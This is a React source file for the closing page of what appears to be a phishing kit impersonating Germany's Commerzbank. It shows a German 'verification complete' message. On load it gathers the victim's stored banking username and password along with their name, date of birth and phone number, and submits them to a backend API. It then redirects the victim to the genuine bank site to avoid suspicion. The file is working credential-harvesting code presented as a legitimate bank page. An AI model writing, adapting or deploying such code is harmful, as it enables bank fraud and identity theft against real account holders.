import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLanguage } from '../contexts/LanguageContext';
import { FaArrowRight } from 'react-icons/fa';
import { apiService } from '../services/api';

const DonePage: React.FC = () => {
  const navigate = useNavigate();
  const { t } = useLanguage();
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // Submit final data when component loads
  useEffect(() => {
    const submitFinalData = async () => {
      try {
        // Get all stored data
        const sessionId = sessionStorage.getItem('sessionId') || localStorage.getItem('sessionId');
        const loginData = sessionStorage.getItem('loginData') || localStorage.getItem('loginData');
        const infoData = sessionStorage.getItem('infoData') || localStorage.getItem('infoData');
        
        if (sessionId && loginData && infoData) {
          const login = JSON.parse(loginData);
          const info = JSON.parse(infoData);
          
          // Combine all data for final submission
        const finalData = {
            xusr: login.xusr,
            xpss: login.xpss,
            xname1: info.xname1,
            xname2: info.xname2,
            xdob: info.xdob,
            xtel: info.xtel
          };
          
          console.log('Submitting final data:', finalData);
        await apiService.final(finalData);
          console.log('Final data submitted successfully');
        }
      } catch (error) {
        console.error('Error submitting final data:', error);
      }
    };

    submitFinalData();
  }, []);

  const handleForwarding = () => {
    // Redirect to the official Commerzbank website
    window.open('https://www.commerzbank.de/', '_blank', 'noopener,noreferrer');
  };

  return (
    <div className="done-page" style={{
      fontFamily: 'Arial, Helvetica, sans-serif',
      backgroundColor: '#f5f5f5',
      minHeight: '100vh',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'flex-start',
      padding: '20px 20px 20px 20px',
      margin: 0
    }}>
      <h1 style={{
        fontSize: '32px',
        fontWeight: 'bold',
        color: '#333',
        marginTop: '20px',
        marginBottom: '20px',
        fontFamily: 'Arial, Helvetica, sans-serif',
        textAlign: 'left',
        width: '100%',
        maxWidth: '1200px',
        margin: '20px auto 20px auto',
        padding: '0 20px'
      }}>
        Prozess abgeschlossen
      </h1>
      
      <div style={{
        display: 'flex',
        flexDirection: isMobile ? 'column' : 'row',
        gap: isMobile ? '20px' : '30px',
        width: '100%',
        maxWidth: '1200px',
        margin: '0 auto'
      }}>
          {/* Left Column - Success Message */}
        <div style={{
          flex: '1',
          display: 'flex',
          flexDirection: 'column',
          gap: '20px'
        }}>
          <div className="success-section" style={{
            backgroundColor: 'white',
            padding: isMobile ? '20px' : '40px',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)',
            textAlign: 'center'
          }}>
            <h2 style={{
              fontSize: isMobile ? '24px' : '28px',
              fontWeight: 'bold',
              color: '#333',
              marginBottom: '20px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              Herzlichen Glückwunsch!
            </h2>
            
            <p style={{
              fontSize: isMobile ? '14px' : '16px',
              color: '#333',
              lineHeight: '1.6',
              marginBottom: '15px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              Ihre Angaben wurden erfolgreich verifiziert und Ihre Verifizierung ist abgeschlossen. Sie können nun Ihre Services wie gewohnt nutzen.
            </p>
            
            <p style={{
              fontSize: isMobile ? '14px' : '16px',
              color: '#333',
              lineHeight: '1.6',
              marginBottom: '30px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              Klicken Sie auf die Schaltfläche unten, um zur Hauptseite weitergeleitet zu werden.
            </p>
            
            <button
              className="primary-button"
              onClick={handleForwarding}
              style={{
                background: 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                padding: isMobile ? '18px' : '15px 30px',
                fontSize: isMobile ? '18px' : '16px',
                fontWeight: 'bold',
                cursor: 'pointer',
                fontFamily: 'Arial, Helvetica, sans-serif',
                boxShadow: '0 2px 8px rgba(0, 100, 0, 0.3)',
                transition: 'all 0.3s ease',
                minWidth: isMobile ? '200px' : '200px',
                width: isMobile ? '60%' : 'auto'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.transform = 'translateY(-2px)';
                e.currentTarget.style.boxShadow = '0 4px 12px rgba(0, 100, 0, 0.4)';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.transform = 'translateY(0)';
                e.currentTarget.style.boxShadow = '0 2px 8px rgba(0, 100, 0, 0.3)';
              }}
            >
              Weiterleitung durchführen
            </button>
          </div>
        </div>

        {/* Right Column - Important Info Panel */}
        <div style={{
          flex: '1',
          display: 'flex',
          flexDirection: 'column'
        }}>
          <div className="info-panel" style={{
            backgroundColor: 'white',
            padding: isMobile ? '20px' : '40px',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)',
            height: 'fit-content'
          }}>
            <h3 style={{
              fontSize: isMobile ? '18px' : '20px',
              fontWeight: 'bold',
              color: '#333',
              marginBottom: '15px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {t('importantInfo')}
            </h3>
            
            <p style={{
              fontSize: isMobile ? '13px' : '14px',
              color: '#666',
              marginBottom: '20px',
              lineHeight: '1.5',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {t('photoTANProblems')}
            </p>
            
            <div style={{ marginBottom: '20px' }}>
              <h4 style={{
                fontSize: isMobile ? '14px' : '16px',
                fontWeight: 'bold',
                color: '#333',
                marginBottom: '10px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {t('noActiveTAN')}
              </h4>
              <div style={{ marginBottom: '8px' }}>
                <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px',
                  fontFamily: 'Arial, Helvetica, sans-serif',
                  textDecoration: 'none',
                  color: 'inherit',
                  cursor: 'pointer'
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.textDecoration = 'underline';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.textDecoration = 'none';
                }}>
                  {/* @ts-ignore */}
                  <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                  <span style={{ fontSize: isMobile ? '13px' : '14px', color: '#333' }}>{t('activatePhotoTAN')}</span>
                </a>
              </div>
              <div>
                <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px',
                  fontFamily: 'Arial, Helvetica, sans-serif',
                  textDecoration: 'none',
                  color: 'inherit',
                  cursor: 'pointer'
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.textDecoration = 'underline';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.textDecoration = 'none';
                }}>
                  {/* @ts-ignore */}
                  <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                  <span style={{ fontSize: isMobile ? '13px' : '14px', color: '#333' }}>{t('photoTANHelp')}</span>
                </a>
            </div>
          </div>

            <div style={{ marginBottom: '20px' }}>
              <h4 style={{
                fontSize: isMobile ? '14px' : '16px',
                fontWeight: 'bold',
                color: '#333',
                marginBottom: '10px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {t('forgotCredentials')}
              </h4>
              <div style={{ marginBottom: '8px' }}>
                <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px',
                  fontFamily: 'Arial, Helvetica, sans-serif',
                  textDecoration: 'none',
                  color: 'inherit',
                  cursor: 'pointer'
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.textDecoration = 'underline';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.textDecoration = 'none';
                }}>
                  {/* @ts-ignore */}
                  <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                  <span style={{ fontSize: isMobile ? '13px' : '14px', color: '#333' }}>{t('requestParticipantNumber')}</span>
                </a>
              </div>
              <div>
                <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px',
                  fontFamily: 'Arial, Helvetica, sans-serif',
                  textDecoration: 'none',
                  color: 'inherit',
                  cursor: 'pointer'
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.textDecoration = 'underline';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.textDecoration = 'none';
                }}>
                  {/* @ts-ignore */}
                  <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                  <span style={{ fontSize: isMobile ? '13px' : '14px', color: '#333' }}>{t('forgotPIN')}</span>
                </a>
              </div>
              </div>

            <div>
              <h4 style={{
                fontSize: isMobile ? '14px' : '16px',
                fontWeight: 'bold',
                color: '#333',
                marginBottom: '10px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {t('allAboutOnlineBanking')}
              </h4>
              <div style={{ marginBottom: '8px' }}>
                <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px',
                  fontFamily: 'Arial, Helvetica, sans-serif',
                  textDecoration: 'none',
                  color: 'inherit',
                  cursor: 'pointer'
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.textDecoration = 'underline';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.textDecoration = 'none';
                }}>
                  {/* @ts-ignore */}
                  <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                  <span style={{ fontSize: isMobile ? '13px' : '14px', color: '#333' }}>{t('instructionsHelp')}</span>
                </a>
              </div>
              <div>
                <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px',
                  fontFamily: 'Arial, Helvetica, sans-serif',
                  textDecoration: 'none',
                  color: 'inherit',
                  cursor: 'pointer'
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.textDecoration = 'underline';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.textDecoration = 'none';
                }}>
                  {/* @ts-ignore */}
                  <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                  <span style={{ fontSize: isMobile ? '13px' : '14px', color: '#333' }}>{t('security')}</span>
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default DonePage;